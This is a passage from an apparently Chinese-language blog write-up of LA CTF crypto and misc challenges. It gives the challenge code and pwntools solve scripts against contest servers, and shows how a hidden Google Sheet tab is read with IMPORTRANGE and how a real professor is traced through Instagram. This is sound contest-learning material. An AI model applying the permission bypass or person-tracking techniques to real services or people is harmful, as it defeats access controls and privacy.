class="hljs-built_in">next</span>(key))<br>    ct += <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;b:02x&#125;</span>&#x27;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ct =&quot;</span>, ct)<br><br><span class="hljs-comment">#ct = 200e0d13461a055b4e592b0054543902462d1000042b045f1c407f18581b56194c150c13030f0a5110593606111c3e1f5e305e174571431e</span><br></code></pre></td></tr></table></figure><h4 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h4><p>异或一下就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span>*<br>pt = <span class="hljs-string">b&quot;Long ago, the four nations lived together in harmony ...&quot;</span><br>ct = <span class="hljs-number">0x200e0d13461a055b4e592b0054543902462d1000042b045f1c407f18581b56194c150c13030f0a5110593606111c3e1f5e305e174571431e</span><br>ct=long_to_bytes(<span class="hljs-built_in">int</span>(ct))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ct)):<br>    flag = (pt[i] ^ ct[i])<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(flag),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-comment">#lactf&#123;b4by_h1t_m3_0ne_m0r3_t1m3&#125;</span><br></code></pre></td></tr></table></figure><h3 id="chinese-lazy-theorem-1"><a href="#chinese-lazy-theorem-1" class="headerlink" title="chinese-lazy-theorem-1"></a>chinese-lazy-theorem-1</h3><h4 id="题目说明-9"><a href="#题目说明-9" class="headerlink" title="题目说明"></a>题目说明</h4><p>I heard about this cool theorem called the Chinese Remainder Theorem, but, uh… I’m feeling kinda tired right now.<br><code>nc lac.tf 31110</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime<br><span class="hljs-keyword">from</span> Crypto.Random.random <span class="hljs-keyword">import</span> randint<br><br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>n = p*q<br><br>target = randint(<span class="hljs-number">1</span>, n)<br><br>used_oracle = <span class="hljs-literal">False</span><br><br><span class="hljs-built_in">print</span>(p)<br><span class="hljs-built_in">print</span>(q)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;To quote Pete Bancini, \&quot;I&#x27;m tired.\&quot;&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;I&#x27;ll answer one modulus question, that&#x27;s it.&quot;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;What do you want?&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;1: Ask for a modulus&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;2: Guess my number&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;3: Exit&quot;</span>)<br>    response = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>)<br><br>    <span class="hljs-keyword">if</span> response == <span class="hljs-string">&quot;1&quot;</span>:<br>        <span class="hljs-keyword">if</span> used_oracle:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;too lazy&quot;</span>)<br>            <span class="hljs-built_in">print</span>()<br>        <span class="hljs-keyword">else</span>:<br>            modulus = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Type your modulus here: &quot;</span>)<br>            modulus = <span class="hljs-built_in">int</span>(modulus)<br>            <span class="hljs-keyword">if</span> modulus &lt;= <span class="hljs-number">0</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;something positive pls&quot;</span>)<br>                <span class="hljs-built_in">print</span>()<br>            <span class="hljs-keyword">else</span>:<br>                used_oracle = <span class="hljs-literal">True</span><br>                <span class="hljs-built_in">print</span>(target%modulus)<br>                <span class="hljs-built_in">print</span>()<br>    <span class="hljs-keyword">elif</span> response == <span class="hljs-string">&quot;2&quot;</span>:<br>        guess = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Type your guess here: &quot;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(guess) == target:<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>                <span class="hljs-built_in">print</span>(f.readline())<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;nope&quot;</span>)<br>        exit()<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;bye&quot;</span>)<br>        exit()<br><br></code></pre></td></tr></table></figure><h4 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路"></a>解题思路</h4><p><code>print(target%modulus)</code>令modulus大于target就可以泄露target<br><img src="/mdimg/lactf/15.png"></p><h3 id="rolling-in-the-mud"><a href="#rolling-in-the-mud" class="headerlink" title="rolling in the mud"></a><strong>rolling in the mud</strong></h3><h4 id="题目说明-10"><a href="#题目说明-10" class="headerlink" title="题目说明"></a>题目说明</h4><p>uugh, these pigs in my pen are making a complete mess! They’re <em>rolling</em> all over the place!<br>Anyway, can you decode this cipher they gave me, almost throwing it at me while rolling around?<br>Answer in lowercase with symbols. In the image, { and } are characters that should appear in your flag, and replace spaces with _.</p><h4 id="解题思路-9"><a href="#解题思路-9" class="headerlink" title="解题思路"></a>解题思路</h4><p><img src="/mdimg/lactf/16.png"><br>显然猪圈<br><a href="http://moersima.00cha.net/zhuquan.asp">http://moersima.00cha.net/zhuquan.asp</a><br><code>&#123;eombmcvcalebupauntcnjppmjfnicnappmjfnippmjfni&#125;dugip</code><br>逆序一下然后<br><a href="http://www.quipqiup.com/">http://www.quipqiup.com/</a>爆破一下<br><code>lactf&#123;rolling_and_rolling_and_rolling_until_the_pigs_go_home&#125;</code></p><h3 id="greek-cipher"><a href="#greek-cipher" class="headerlink" title="greek cipher"></a>greek cipher</h3><h4 id="题目说明-11"><a href="#题目说明-11" class="headerlink" title="题目说明"></a>题目说明</h4><p>You think you’ve seen all of the “classic” ciphers? Instead of your standard cipher, I’ve created my own cipher: the monoalphagreek cipher!<br>Answer with just the flag in lowercase with symbols left in.</p><h4 id="解题思路-10"><a href="#解题思路-10" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">κςκ ωπν αζπλ ιησι χνοςνθ μσγθσρ λσθ ζπι ιηγ δςρθι ψγρθπζ ςζ ηςθιπρω θνθψγμιγκ πδ νθςζε γζμρωψιςπζ? τγ ζγςιηγρ. κςκ ωπν αζπλ ιησι χνοςνθ μσγθσρ λσθ ψρπξσξοω δονγζι ςζ εργγα? τγ ζγςιηγρ. ς οςαγ ηπλ εργγα μησρσμιγρ οππα ιηπνεη, γυγζ ςδ ς μσζ<span class="hljs-string">&#x27;ι ργσκ ιηγτ. οσμιδ&#123;ς_ενγθθ_νθςζε_τσζω_εργγα_μησρσμιγρθ_κςκζ&#x27;</span>ι<span class="hljs-literal">_</span>θιπψ<span class="hljs-literal">_</span>ωπν.<span class="hljs-literal">_</span>λγοο<span class="hljs-literal">_</span>ψοσωγκ<span class="hljs-literal">_</span>ς<span class="hljs-literal">_</span>τνθι<span class="hljs-literal">_</span>θσω.μπζερσιθ!&#125;<br></code></pre></td></tr></table></figure><p>参考了国外师傅的wp，只能说6666<br><code>**print(&#39;&#39;.join(sorted(set(input()))))**</code><br>这段代码实现了一个字符串的去重排序功能。它会接收用户的输入作为字符串，将其转换为一个集合，从而删除重复的字符。然后，它将集合排序，并将其转换回字符串。最后，代码使用 “print” 函数打印出结果。<br>然后借助一个工具网站<a href="https://tio.run/#">https://tio.run/#</a><br><img src="/mdimg/lactf/17.png"><br>然后用Cyberchef的Substitute<br><img src="/mdimg/lactf/18.png"><br>最后quipqiup<br><img src="/mdimg/lactf/19.png"></p><h3 id="guess-the-bit"><a href="#guess-the-bit" class="headerlink" title="guess-the-bit!"></a>guess-the-bit!</h3><h4 id="题目说明-12"><a href="#题目说明-12" class="headerlink" title="题目说明"></a>题目说明</h4><p>I’m trying out for this new game show, but it doesn’t seem that hard since there are only two choices? Regardless, I heard someone name Pollard could help me out with it?</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime<br><br>n = <span class="hljs-number">43799663339063312211273714468571591746940179019655418145595314556164983756585900662541462573429625012257141409310387298658375836921310691578072985664621716240663221443527506757539532339372290041884633435626429390371850645743643273836882575180662344402698999778971350763364891217650903860191529913028504029597794358613653479290767790778510701279503128925407744958108039428298936189375732992781717888915493080336718221632665984609704015735266455668556495869437668868103607888809570667555794011994982530936046877122373871458757189204379101886886020141036227219889443327932080080504040633414853351599120601270071913534530651</span><br><br>a = <span class="hljs-number">6</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n = &quot;</span>, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;a = &quot;</span>, <span class="hljs-number">6</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">150</span>):<br>    bit = random.randrange(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>)<br>    c = random.randrange(<span class="hljs-number">0</span>, n)<br>    c = c**<span class="hljs-number">2</span><br>    <span class="hljs-keyword">if</span> bit == <span class="hljs-number">1</span>:<br>        c *= a<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c = &quot;</span>, c)<br>    guess = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;What is your guess? &quot;</span>))<br>    <span class="hljs-keyword">if</span> guess != bit:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Better luck next time!&quot;</span>)<br>        exit()<br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Congrats! Here&#x27;s your flag: &quot;</span>)<br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).readline().strip()<br><span class="hljs-built_in">print</span>(flag)<br>exit(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><h4 id="解题思路-11"><a href="#解题思路-11" class="headerlink" title="解题思路"></a>解题思路</h4><p>仔细观察加密源码逻辑，进行了 150 次循环，每次循环都生成一个随机数字 c，该数字要么是原始数字的平方，要么是原始数字的平方与 6的积。所以需要猜测该数字是否是平方或者6的倍数。<img src="/mdimg/lactf/20.png"><br>如上图所示，如果两个条件都成立，向服务器返回”1” ，否则返回 “0” 。可以一个个去算，但是捏，150次，懂自懂，所以借助pwntools来写个脚本来交互。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> sympy.ntheory.primetest <span class="hljs-keyword">import</span> is_square <br><br>p = remote(<span class="hljs-string">&#x27;lac.tf&#x27;</span>, <span class="hljs-number">31190</span>)<br>p.recvline()<br>p.recvline()<br><br>C = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">while</span> C != <span class="hljs-number">150</span>:<br>    c = <span class="hljs-built_in">int</span>((p.recvline().decode()).split(<span class="hljs-string">&quot; &quot;</span>)[-<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">if</span> c%<span class="hljs-number">6</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> is_square(c//<span class="hljs-number">6</span>):<br>        p.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        p.sendline(<span class="hljs-string">b&quot;0&quot;</span>)<br>    C += <span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(C,end=<span class="hljs-string">&quot;\r&quot;</span>)<br><span class="hljs-built_in">print</span>(p.recv(<span class="hljs-number">1024</span>))<br><span class="hljs-built_in">print</span>(p.recv(<span class="hljs-number">1024</span>))<br><br><span class="hljs-comment"># lactf&#123;sm4ll_pla1nt3xt_sp4ac3s_ar3n&#x27;t_al4ways_e4sy&#125;</span><br></code></pre></td></tr></table></figure><h3 id="chinese-lazy-theorem-2"><a href="#chinese-lazy-theorem-2" class="headerlink" title="chinese-lazy-theorem-2"></a>chinese-lazy-theorem-2</h3><h4 id="题目说明-13"><a href="#题目说明-13" class="headerlink" title="题目说明"></a>题目说明</h4><p>Ok I’m a little less lazy now but you’re still not getting much from me.<br><code>nc lac.tf 31111</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/local/bin/python3</span><br><br><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime<br><span class="hljs-keyword">from</span> Crypto.Random.random <span class="hljs-keyword">import</span> randint<br><br><br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>n = p*q*<span class="hljs-number">2</span>*<span class="hljs-number">3</span>*<span class="hljs-number">5</span><br><br><br>target = randint(<span class="hljs-number">1</span>, n)<br><br><br>oracle_uses = <span class="hljs-number">0</span><br><br><br><span class="hljs-built_in">print</span>(p)<br><span class="hljs-built_in">print</span>(q)<br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;This time I&#x27;ll answer 2 modulus questions and give you 30 guesses.&quot;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;What do you want?&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;1: Ask for a modulus&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;2: Guess my number&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;3: Exit&quot;</span>)<br>    response = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>)<br><br><br>    <span class="hljs-keyword">if</span> response == <span class="hljs-string">&quot;1&quot;</span>:<br>        <span class="hljs-keyword">if</span> oracle_uses == <span class="hljs-number">2</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;too lazy&quot;</span>)<br>            <span class="hljs-built_in">print</span>()<br>        <span class="hljs-keyword">else</span>:<br>            modulus = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Type your modulus here: &quot;</span>)<br>            modulus = <span class="hljs-built_in">int</span>(modulus)<br>            <span class="hljs-keyword">if</span> modulus &lt;= <span class="hljs-number">0</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;something positive pls&quot;</span>)<br>                <span class="hljs-built_in">print</span>()<br>            <span class="hljs-keyword">elif</span> modulus &gt; <span class="hljs-built_in">max</span>(p, q):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;something smaller pls&quot;</span>)<br>                <span class="hljs-built_in">print</span>()<br>            <span class="hljs-keyword">else</span>:<br>                oracle_uses += <span class="hljs-number">1</span><br>                <span class="hljs-built_in">print</span>(target%modulus)<br>                <span class="hljs-built_in">print</span>()<br>    <span class="hljs-keyword">elif</span> response == <span class="hljs-string">&quot;2&quot;</span>:<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>            guess = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Type your guess here: &quot;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(guess) == target:<br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>                    <span class="hljs-built_in">print</span>(f.readline())<br>                    exit()<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;nope&quot;</span>)<br>        exit()<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;bye&quot;</span>)<br>        exit()<br></code></pre></td></tr></table></figure><h4 id="解题步骤-1"><a href="#解题步骤-1" class="headerlink" title="解题步骤"></a>解题步骤</h4><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> sympy.ntheory.modular <span class="hljs-keyword">import</span> crt<br><br><span class="hljs-keyword">with</span> remote(<span class="hljs-string">&quot;lac.tf&quot;</span>, <span class="hljs-number">31111</span>) <span class="hljs-keyword">as</span> r:<br>p = <span class="hljs-built_in">int</span>(r.readline(<span class="hljs-literal">False</span>))<br>q = <span class="hljs-built_in">int</span>(r.readline(<span class="hljs-literal">False</span>))<br>r.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>r.readuntil(<span class="hljs-string">b&quot;Type your modulus here: &quot;</span>)<br>r.sendline(<span class="hljs-built_in">str</span>(p).encode())<br>x = <span class="hljs-built_in">int</span>(r.readline(<span class="hljs-literal">False</span>))<br>r.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>r.readuntil(<span class="hljs-string">b&quot;Type your modulus here: &quot;</span>)<br>r.sendline(<span class="hljs-built_in">str</span>(q).encode())<br>y = <span class="hljs-built_in">int</span>(r.readline(<span class="hljs-literal">False</span>))<br>a, b = crt([p,q],[x,y])<br>r.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>r.readuntil(<span class="hljs-string">b&quot;Type your guess here: &quot;</span>)<br>r.sendline(<span class="hljs-built_in">str</span>(a+i*b).encode())<br><span class="hljs-built_in">print</span>(r.readline())<br></code></pre></td></tr></table></figure><p><img src="/mdimg/lactf/21.png"></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="CATS"><a href="#CATS" class="headerlink" title="CATS!"></a>CATS!</h3><h4 id="题目说明-14"><a href="#题目说明-14" class="headerlink" title="题目说明"></a>题目说明</h4><p>CATS OMG I CAN’T BELIEVE HOW MANY CATS ARE IN THIS IMAGE I NEED TO VISIT CAN YOU FIGURE OUT THE NAME OF THIS CAT HEAVEN?<br>Answer is the domain of the website for this location. For example, if the answer was ucla, the flag would be lactf{ucla.edu}.</p><h4 id="解题思路-12"><a href="#解题思路-12" class="headerlink" title="解题思路"></a>解题思路</h4><p>g0at：一眼丁真的社工题<br><img src="/mdimg/lactf/22.png"><br><img src="/mdimg/lactf/23.png"><br><a href="https://www.mentalfloss.com/article/576608/lanai-cat-sanctuary-hawaii-shelters-600-cats">https://www.mentalfloss.com/article/576608/lanai-cat-sanctuary-hawaii-shelters-600-cats</a>文章里面有他们的官网 如下图所示<br><img src="/mdimg/lactf/24.png"></p><h3 id="hike-to-where"><a href="#hike-to-where" class="headerlink" title="hike to where?"></a>hike to where?</h3><h4 id="题目说明-15"><a href="#题目说明-15" class="headerlink" title="题目说明"></a>题目说明</h4><p>Where was this photo taken? I think it used to be in the original photo, but someone cropped it out!<br>The flag is <code>lactf&#123;location&#125;</code>, where location is the name of the POI that this person hiked up to, all lowercase and replacing spaces with underscrolls. Use the google maps name of the POI: for example, if the solution is the UCLA Bruin Bear statue, <a href="https://www.google.com/maps/place/Bruin+Statue,+Los+Angeles,+CA+90095/@34.0709817,-118.4451726,21z/data=!4m6!3m5!1s0x80c2bc88d12933e3:0xa3b319ea03ca4057!8m2!3d34.0709621!4d-118.4449902!16s%2Fg%2F12hl7g0mm">this</a> is the google maps location, and the flag would be <code>lactf&#123;bruin_statue&#125;</code>.<br>Please note: contacting anyone or any organization beyond official LA CTF support channels regarding this challenge is against the rules. Please be respectful of those who are involved in this challenge.<br><img src="/mdimg/lactf/25.png"></p><h4 id="解题思路-13"><a href="#解题思路-13" class="headerlink" title="解题思路"></a>解题思路</h4><p>从他的衣服上面的字可以知道他是ucla的计算机学院的老师<br>尝试在ucla的官网找这个老师，但是没找到<br><img src="/mdimg/lactf/26.png"><br>em…….识别出来的这个是生物老师<br>题目是远足，那就google一下<br><img src="/mdimg/lactf/27.png"><br>在Instagram里面找到这个人<a href="https://www.instagram.com/peaksandprofessors.ucla/">https://www.instagram.com/peaksandprofessors.ucla/</a><br><img src="/mdimg/lactf/28.png"><br><img src="/mdimg/lactf/29.png"><br><code>lactf&#123;skull_rock&#125;</code></p><h3 id="hidden-in-plain-sheets"><a href="#hidden-in-plain-sheets" class="headerlink" title="hidden in plain sheets"></a>hidden in plain sheets</h3><h4 id="题目说明-16"><a href="#题目说明-16" class="headerlink" title="题目说明"></a>题目说明</h4><p>I found this google sheets link on the internet. I’m sure it’s hiding something, but I can’t find anything? Can you find the flag?<br>Choose any link (they’re all the same):  <a href="https://docs.google.com/spreadsheets/d/1OYx3lCccLKYgOvzxkRZ5-vAwCn3mOvGUvB4AdnSbcZ4/edit">Link 1</a> <a href="https://docs.google.com/spreadsheets/d/17A1f0z8rmR7356fcHmHTHt3Y0JMgcHlGoflADtNXeOU/edit">Link 2</a> <a href="https://docs.google.com/spreadsheets/d/1ULdm_KCOYCWuf6gqpg6tm0t-wnWySX_Bf3yUYOfZ2tw/edit">Link 3</a></p><h4 id="解题思路-14"><a href="#解题思路-14" class="headerlink" title="解题思路"></a>解题思路</h4><p>flag在另一个Sheet但我们没有查看权限<img src="/mdimg/lactf/30.png"><br>经过查资料发现Google表格的<code>IMPORTRANGE</code>函数可以做到倒入内容这一点。<br><img src="/mdimg/lactf/31.png"><br>所以直接get flag<br><img src="/mdimg/lactf/32.png"></p><h3 id="ECB"><a href="#ECB" class="headerlink" title="ECB"></a>ECB</h3><h4 id="题目说明-17"><a href="#题目说明-17" class="headerlink" title="题目说明"></a>题目说明</h4><p>I was trying to send a flag to my friend over UDP, one character at a time, but it got corrupted! I think someone else was messing around with me and sent extra bytes, though it seems like they actually abided by RFC 3514 for once. Can you get the flag?</p><h4 id="解题思路-15"><a href="#解题思路-15" class="headerlink" title="解题思路"></a>解题思路</h4><p>UDP流量分析，采用了RFC 3514 <a href="https://www.ietf.org/rfc/rfc3514.txt">https://www.ietf.org/rfc/rfc3514.txt</a><br><img src="/mdimg/lactf/33.png"><br>:::tips<br>Flags是flag Segment的缩写，是标志字段。<br>它其实是IP报文头中的一个字段，因为TCP、UDP协议，应用层协议大部分都是封装在IP包中的，所以分析这些协议时，就会经常看到这个字段。<br>标识字段有3位。<br>Reserved bit：1位,是保留位，一般用不上；<br>Don’t fragment ：1位，用来表示数据包是否分片（Not set表示数据包没有分片）；<br>More fragment：1位，用来表示是否是最后一个片段（Not set表示是最后一个）。<br>:::<br>查看flags字段和Data段，data段有1字节数据。<br><img src="/mdimg/lactf/34.png"><br>往下看，在N0.5，<br><img src="/mdimg/lactf/35.png"><br>查看RFC 3514官方文档，如果IP<code> Reserved bit</code> 设置为 <code>1 (0x1)</code>，则它是一个恶意数据包。<br><img src="/mdimg/lactf/36.png"><br>所以我们只需要将<code>Reserved bit</code>为0的包过滤出来，将data和Reserved bit设置为列，并将Reserved bit为0设置为过滤条件，也就是<code>ip.flags.rb == 0</code>，观察前几个发现就是lactf的hex值。<br><img src="/mdimg/lactf/37.png"><br>导出过滤后的udp流<br>选择导出特定分组<br><img src="/mdimg/lactf/38.png"><br>打开保存的udp流量包<br>追踪udp流<br><img src="/mdimg/lactf/39.png"><br><code>lactf&#123;3V1L_817_3xf1l7R4710N_4_7H3_W1N_51D43c8000034d0c&#125;</code><br>tshark：<br><code>**tshark -r EBE.pcap -Y &quot;ip.flags.rb == 0x0&quot; -T fields -e data | xxd -r -p**</code><br><img src="/mdimg/lactf/40.png"></p><h3 id="discord-l34k"><a href="#discord-l34k" class="headerlink" title="discord l34k"></a>discord l34k</h3><h4 id="题目说明-18"><a href="#题目说明-18" class="headerlink" title="题目说明"></a>题目说明</h4><p>My friend sent me <a href="https://discord.com/channels/1060030874722259057/1060030875187822724/1060031064669700186">this</a> message link that apparently links to a “flag”, but discord says “You don’t have access to this link”! They did mention something about them being able to embed a list of online users on their own website, and sent me this image. Can you figure out how to join the server?<br>Note: Discord phone verification is NOT required for this challenge.</p><h4 id="解题思路-16"><a href="#解题思路-16" class="headerlink" title="解题思路"></a>解题思路</h4><p>题目给了一个discord链接<br><code>[https://discord.com/channels/1060030874722259057/1060030875187822724/1060031064669700186](https://discord.com/channels/1060030874722259057/1060030875187822724/1060031064669700186)</code><br><a href="https://discord.com/blog/add-the-discord-widget-to-your-site/">https://discord.com/blog/add-the-discord-widget-to-your-site/</a> 在这篇文章中找到关键图片<br><img src="/mdimg/lactf/41.png"><br>图片下面看到用于 JSON API的URL。在给定的 URL 中，第一个 ID ( 1060030874722259057) 指的是服务器，因此我们将其放在图像中示例 ID 